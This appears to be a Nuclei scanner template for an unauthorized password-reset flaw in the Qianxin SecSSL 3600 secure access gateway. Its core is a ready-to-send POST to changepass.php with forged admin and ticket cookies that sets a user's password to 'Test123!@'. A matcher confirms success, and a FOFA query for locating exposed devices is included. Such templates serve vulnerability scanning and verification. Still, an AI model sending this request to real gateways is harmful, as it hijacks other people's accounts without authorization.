id: qianxin-secgate-changepass-resetpass
info:
  name: 奇安信 SecSSL3600 安全接入网关系统 - 任意密码修改
  author: leadlife
  severity: high
  description: 网神 SecSSL 3600安全接入网关系统 存在未授权访问漏洞，攻击者通过漏洞可以获取用户列表，并修改用户账号密码
  reference: 
    - https://github.com/wy876/POC/blob/main/%E7%BD%91%E7%A5%9E/%E6%9F%90%E7%A5%9ESecSSL3600%E5%AE%89%E5%85%A8%E6%8E%A5%E5%85%A5%E7%BD%91%E5%85%B3%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E.md
  classification:
    cve-id: 
  metadata:
    verified: true/false
    max-request: 1
    fofa-query: app="安全接入网关SecSSLVPN"
    hunter-query: demo
    tips:
    repair:
    version:
  tags: 360,qianxin,resetpass,secgate

http:
  - raw:
      - |
        POST /changepass.php?type=2 HTTP/1.1
        Host: {{Hostname}}
        Cookie: admin_id=1; gw_user_ticket=ffffffffffffffffffffffffffffffff; last_step_param={"this_name":"test","subAuthId":"1"}

        old_pass=&password=Test123!@&repassword=Test123!@
        
    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains(body,'修改密码成功')
        condition: and